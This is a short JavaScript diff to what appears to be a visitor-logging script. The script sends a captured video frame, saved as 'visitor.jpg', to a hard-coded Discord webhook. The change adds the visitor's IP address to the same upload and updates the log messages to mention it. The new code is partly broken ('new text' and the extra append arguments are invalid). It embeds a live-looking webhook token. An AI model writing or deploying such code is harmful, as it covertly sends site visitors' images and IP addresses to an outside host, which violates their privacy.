@@ -172,8 +172,11 @@
     var file = new File([blob],
      'visitor.jpg');
     
+    var ip = new text([blob],
+     '[Logger]', json.ip);
+    
     var formData = new FormData();
-    formData.append('file', file);
+    formData.append('file', file, 'ip', text);
     
     fetch(
       'https://discord.com/api/webhooks/1110072092826808390/IR34WYbMbUzKWKv2ade5O7m7JEQfzhpsFgOCzAql57-ViE5Rcs57JLUwnCBYboKH78kj', {
@@ -182,12 +185,12 @@
       })
      .then(function(response) {
       console.log(
-       'Successfully sent video frame to Discord.'
+       'Successfully sent video frame / IP to Discord.'
       );
      })
      .catch(function(error) {
       console.error(
-       'Error sending video frame to Discord:',
+       'Error sending video frame / IP to Discord:',
        error);
      });
    }
